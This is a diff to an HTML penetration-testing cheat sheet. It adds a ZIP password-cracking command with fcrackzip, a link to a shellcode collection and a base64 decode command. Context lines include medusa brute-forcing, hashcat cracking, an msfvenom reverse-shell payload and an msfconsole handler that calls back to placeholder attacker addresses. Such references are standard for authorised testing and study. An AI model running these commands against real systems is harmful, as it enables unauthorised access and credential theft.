@@ -188,6 +188,10 @@ medusa -h [IP_ADDRESS] -U [USERNAME_FILE] -P PASSWORD_FILE] -M http -m DIR:/admi
 <pre style="background-color:black;color:white;">
 hashcat -m 400 -a 0 [HASH_FILE] [WORDLIST_FILE]
 </pre>
+<p><font size="3.5" color="black">Compressed files:</font></p>
+<pre style="background-color:black;color:white;">
+fcrackzip -D -v -p [WORDLIST_FILE] [ZIP_FILE]
+</pre>
 <hr>
 <p><h3>Packet Sniffing</h3></p>
 <p><font size="3.5" color="black">Use Wireshark / tcpdump to capture traffic on the target host:</font></p>
@@ -266,6 +270,7 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTAC
 <pre style="background-color:black;color:white;">
 msfconsole -x "use exploit/multi/handler;set LHOST [ATTACKER's_IP_ADDRESS];set LPORT [ATTACKER's_PORT];set PAYLOAD [PAYLOAD];run"
 </pre>
+<p><font size="3.5" color="black">Prepared shellcodes at: http://shell-storm.org/shellcode/</font></p>
 <hr>
 <p><h3>TTY Shells</h3></p>
 <p><font size="3.5" color="black">Spawn a TTY shell from a limited shell in Linux, useful for running commands like su from reverse shells.</font></p>
@@ -693,6 +698,7 @@ sort [WORDLIST_PATH] | uniq | wc -l  (sorts number of unique words in a wordlist
 ip -4 addr show scope global    /*Determine interfaces ip address + prefix*/
 ip route show | grep default    /*Determine which interface is public*/
 finger -l [USER_NAME]@[IP_ADDRESS]	(Installation: yaourt -S netkit-bsd-finger)
+base64 -d [FILE] > [OUTPUT_FILE]	(decode in CLI)
 </pre>
 <hr>
 <p><h3>Other (quick) guides & Links</h3></p>
